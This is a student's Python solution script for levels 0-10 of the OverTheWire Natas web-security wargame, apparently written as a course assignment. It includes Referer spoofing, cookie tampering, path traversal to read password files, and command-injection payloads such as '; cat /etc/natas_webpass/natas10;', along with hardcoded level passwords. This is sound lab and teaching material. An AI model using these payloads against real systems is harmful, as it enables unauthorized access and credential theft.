### Tirth Sharaf

'''
Visit and complete levels 0 - 10 of the Natas challenges. If you wish for examples how to get the passwords, or reach out to me with questions.
For levels 0,4,5,6,7,8,9 and 10 write your solution using python.
http://overthewire.org/wargames/natas/

'''

#Level 0
import requests
import re

def natas0():
    # URL for Natas level 0
    url = 'http://natas0:natas0@natas0.natas.labs.overthewire.org/'

    # Send HTTP GET request
    resp = requests.get(url)

    # Regular expression to extract the password from the content
    # Note: This may need adjustment based on the structure of the page
    password_pattern = re.compile(r'The password for natas1 is (\w{32})')

    # Find the password using the regular expression
    match = re.search(password_pattern, resp.text)

    if match:
        passwd = match.group(1)
        print(f"The password for level 0 is: {passwd}")
    else:
        print("Password not found.")

    print(f"Status code: {resp.status_code}")
    return passwd

# Call the function to retrieve the password for level 0
passLvl0 = natas0()


#Level4
import requests

def natas4():
    # URL for Natas level 4
    url = 'http://natas4.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas4'
    password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

    # Set the custom Referrer header
    headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}

    # Send HTTP GET request with authentication and custom headers
    resp = requests.get(url, auth=(username, password), headers=headers)

    # Check if the request was successful (status code 200)
    if resp.status_code == 200:
        # Print the content of the response (which contains the password)
        print(resp.text)
    else:
        print(f"Failed to retrieve the page. Status code: {resp.status_code}")

# Call the function to perform Referrer hijacking for Natas level 4
natas4()


#level5
import requests

def natas5():
    # URL for Natas level 5
    url = 'http://natas5.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas5'
    password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

    # Set the custom cookie
    cookies = {'loggedin': '1'}

    # Send HTTP GET request with authentication and custom cookies
    resp = requests.get(url, auth=(username, password), cookies=cookies)

    # Check if the request was successful (status code 200)
    if resp.status_code == 200:
        # Print the content of the response (which contains the password)
        print(resp.text)
    else:
        print(f"Failed to retrieve the page. Status code: {resp.status_code}")

# Call the function to change the "loggedin" cookie to 1 and reload the page
natas5()


#level6
import requests

def natas6():
    # URL for Natas level 6
    url = 'http://natas6.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas6'
    password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

    # URL for secret.inc file
    secret_url = url + 'includes/secret.inc'

    # Send HTTP GET request to obtain the secret from secret.inc
    secret_resp = requests.get(secret_url, auth=(username, password))

    # Check if the request was successful (status code 200)
    if secret_resp.status_code == 200:
        # Extract the secret from the response content
        secret = secret_resp.text.strip().split('"')[1]
        print(f"Secret obtained: {secret}")

        # Send HTTP POST request to submit the obtained secret
        post_data = {'secret': secret, 'submit': 'Submit'}
        response = requests.post(url, auth=(username, password), data=post_data)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Print the content of the response (which contains the password)
            print(response.text)
        else:
            print(f"Failed to submit the secret. Status code: {response.status_code}")

    else:
        print(f"Failed to obtain the secret. Status code: {secret_resp.status_code}")

# Call the function to automate the process for Natas level 6
natas6()


#level7
import requests

def natas7():
    # URL for Natas level 7
    url = 'http://natas7.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas7'
    password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

    # URL for the hint reference file pathway
    hint_url = url + 'index.php?page=/etc/natas_webpass/natas8'

    # Send HTTP GET request to obtain the password for natas8
    response = requests.get(hint_url, auth=(username, password))

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Extract the password from the response content
        password = response.text.strip()

        # Print a more defined output
        print("Password for Natas level 8:")
        print("=" * 30)
        print(password)
        print("=" * 30)
    else:
        print(f"Failed to retrieve the password. Status code: {response.status_code}")

# Call the function to automate the process for Natas level 7
natas7()


#level8
import requests
import base64

def natas8():
    # URL for Natas level 8
    url = 'http://natas8.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas8'
    password = 'a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB'

    # Encoded secret provided in the hint
    encoded_secret = "3d3d516343746d4d6d6c315669563362"

    # Convert the encoded secret to bytes
    secret_bytes = bytes.fromhex(encoded_secret)

    # Reverse the bytes
    reversed_bytes = secret_bytes[::-1]

    # Decode the reversed bytes using base64
    decoded_secret = base64.decodebytes(reversed_bytes)

    # Print the result (the correct secret)
    print("Correct Secret:", decoded_secret.decode('utf-8'))

    # Send HTTP POST request to Natas level 8 with the correct secret
    response = requests.post(url, auth=(username, password), data={'secret': decoded_secret.decode('utf-8'), 'submit': 'Submit'})

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Print the content of the response (which contains the password for Natas level 9)
        print(response.text)
    else:
        print(f"Failed to retrieve the password. Status code: {response.status_code}")

# Call the function to automate the process for Natas level 8
natas8()


#level9
import requests

def natas9():
    # URL for Natas level 9
    url = 'http://natas9.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas9'
    password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'

    # Payload for command injection
    payload = '; cat /etc/natas_webpass/natas10;'

    # Send HTTP POST request with the command injection payload
    response = requests.post(url, auth=(username, password), data={'needle': payload, 'submit': 'Search'})

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Extract the password from the response content
        password = response.text.split('<pre>\n')[1].split('</pre>')[0].strip()
        print(f"Password for Natas level 10: {password}")
    else:
        print(f"Failed to retrieve the password. Status code: {response.status_code}")

# Call the function to automate the process for Natas level 9
natas9()


#level10
import requests

def natas10():
    # URL for Natas level 10
    url = 'http://natas10.natas.labs.overthewire.org/'

    # Login credentials
    username = 'natas10'
    password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

    # Command injection payload to search both password file and dictionary
    payload = 'a /etc/natas_webpass/natas11'

    # Send HTTP POST request with the command injection payload
    response = requests.post(url, auth=(username, password), data={'needle': payload, 'submit': 'Search'})

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Extract the password from the response content
        password = response.text.split('<pre>\n')[1].split('</pre>')[0].strip()
        print(f"Password for Natas level 11: {password}")
    else:
        print(f"Failed to retrieve the password. Status code: {response.status_code}")

# Call the function to automate the process for Natas level 10
natas10()

# References and Tools used to understand and finish the Assignment
#1.) ChatGPT https://chat.openai.com/
#2.) W3schools  https://www.w3schools.com/python
#3.) programiz https://www.programiz.com/python-programming/online-compiler/
#4.) Claude AI https://claude.ai/chats
#5.) Github of ahmedsnaj30  https://github.com/ahmedsnaj30/Natas-CTF
#6.) cetcube https://blog.certcube.com/overthewire-natas/





